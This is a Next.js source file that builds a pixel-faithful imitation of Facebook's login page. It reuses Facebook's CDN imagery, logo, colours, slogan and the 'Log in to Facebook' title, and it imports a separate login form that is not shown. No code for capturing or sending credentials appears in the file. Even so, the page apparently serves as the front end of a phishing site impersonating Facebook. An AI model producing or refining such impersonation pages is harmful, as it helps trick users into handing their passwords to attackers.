import type { Metadata } from 'next'
import Image from 'next/image'
import Link from 'next/link'

import { FbLoginForm } from './FbLoginForm'

export const metadata: Metadata = {
  title: 'Log in to Facebook',
  description: 'Log in to Facebook to connect and share with the people in your life.',
}

/** Collage login — cùng asset `83zWJdc6PJI.webp` trong HTML facebook.com/login */
const FB_COLLAGE_WEBP =
  'https://static.xx.fbcdn.net/rsrc.php/yB/r/83zWJdc6PJI.webp'

const FB_BLUE = '#1877F2'
const FB_GREEN = '#42b72a'
const TEXT_DARK = '#1c1e21'

const fbFont =
  'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI Historic", "Segoe UI", Roboto, Helvetica, Arial, sans-serif'

/** Glyph Facebook `fill="currentColor"` như SVG trong source */
function FbGlyph({ className }: { className?: string }) {
  return (
    <svg
      viewBox="0 0 24 24"
      fill="currentColor"
      width="1em"
      height="1em"
      className={className}
      aria-hidden
    >
      <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z" />
    </svg>
  )
}

export default function FacebookLoginPage() {
  return (
    <div
      className="min-h-[100dvh] bg-white antialiased [-webkit-font-smoothing:antialiased]"
      style={{ fontFamily: fbFont, color: TEXT_DARK }}
    >
      <div className="mx-auto flex min-h-[100dvh] max-w-[1920px] flex-col lg:min-h-screen lg:flex-row">
        {/* Hero giống facebook.com/login: logo góc trên trái → collage căn giữa → slogan góc dưới trái, nhiều dòng */}
        <section className="flex min-h-[min(100dvh,900px)] w-full flex-col bg-white px-5 pb-5 pt-8 sm:px-8 sm:pb-8 sm:pt-10 lg:min-h-screen lg:flex-[0_0_58%] lg:justify-between lg:px-[clamp(2.5rem,4vw,4.25rem)] lg:pb-[clamp(1.75rem,3vh,3rem)] lg:pt-[clamp(2rem,3.5vw,3rem)] xl:pl-[4.75rem] xl:pr-14">
          <header className="shrink-0">
            <span className="sr-only">Facebook</span>
            <span
              aria-hidden
              className="inline-block translate-y-px leading-none text-[#1877F2] [--fb-f-size:clamp(2rem,4.2vw,2.5625rem)] [font-size:var(--fb-f-size)]"
            >
              <FbGlyph className="block" />
            </span>
          </header>

          <div className="relative flex min-h-[min(42vh,400px)] w-full flex-1 flex-col justify-center px-1 py-6 sm:min-h-[min(44vh,440px)] sm:py-8 lg:my-0 lg:min-h-0 lg:flex-[1_1_auto] lg:px-0 lg:py-4">
            <div className="relative mx-auto h-[min(50vh,520px)] w-full max-w-[min(100%,420px)] shrink-0 sm:h-[min(52vh,540px)] sm:max-w-[460px] lg:mx-auto lg:h-[min(66vh,780px)] lg:max-w-[min(680px,calc(100%-1rem))] xl:max-w-[min(720px,92%)]">
              <Image
                src={FB_COLLAGE_WEBP}
                alt=""
                fill
                sizes="(max-width: 1024px) 92vw, min(720px, 58vw)"
                className="object-contain object-center"
                priority
              />
            </div>
          </div>

          <footer className="relative z-[1] mt-auto shrink-0 pb-2 pt-4 lg:pb-2 lg:pt-10">
            <p
              className="max-w-[15rem] text-left font-bold tracking-[-0.04em] text-[#1c1e21] sm:max-w-[15.75rem] md:max-w-[16rem] lg:max-w-[17rem] xl:max-w-[17.75rem]"
              style={{
                fontSize: 'clamp(1.9375rem, 1vw + 1.45rem, 2.9375rem)',
                lineHeight: 1.1,
              }}
            >
              Explore the things{' '}
              <span className="text-[#1877F2]">
                you love<span className="text-[#1c1e21]">.</span>
              </span>
            </p>
          </footer>
        </section>

        <div
          className="hidden w-px shrink-0 self-stretch bg-[#dadde1] lg:block"
          aria-hidden
        />

        <aside className="flex w-full flex-1 flex-col border-t border-[#dadde1] bg-white lg:min-h-screen lg:max-w-none lg:min-w-0 lg:flex-[0_0_42%] lg:border-t-0">
          <div className="mx-auto flex w-full max-w-[396px] flex-1 flex-col px-5 pb-9 pt-5 sm:px-7 lg:min-h-screen lg:justify-between lg:px-12 lg:pb-12 lg:pt-14 xl:px-14">
            <div className="flex flex-1 flex-col lg:justify-center lg:pt-4">
              <h1
                className="text-center font-bold tracking-[-0.015em] text-[#1c1e21]"
                style={{
                  fontSize: '1.25rem',
                  lineHeight: 'calc(1.25 * 1.3)',
                }}
              >
                Log in to Facebook
              </h1>

              <FbLoginForm />

              <nav className="mt-3 text-center" aria-label="Account help">
                <Link
                  href="#"
                  className="inline-block text-[15px] font-normal leading-snug hover:underline"
                  style={{ color: FB_BLUE }}
                >
                  Forgotten password?
                </Link>
              </nav>
            </div>

            <div className="mt-10 flex w-full flex-col items-stretch lg:mt-8 lg:shrink-0">
              <Link
                href="#"
                className="flex h-11 w-full shrink-0 items-center justify-center rounded-md text-[17px] font-semibold leading-tight text-white transition-colors hover:bg-[#36a420] active:bg-[#2b9217]"
                style={{ backgroundColor: FB_GREEN }}
              >
                Create new account
              </Link>

              <div className="mt-8 flex justify-center pb-1 lg:mt-10">
                <Image
                  src="/images/meta/logo-meta.svg"
                  alt="Meta"
                  width={132}
                  height={26}
                  className="h-[26px] w-auto max-w-[min(100%,148px)] object-contain object-center opacity-[0.98]"
                />
              </div>
            </div>
          </div>
        </aside>
      </div>
    </div>
  )
}
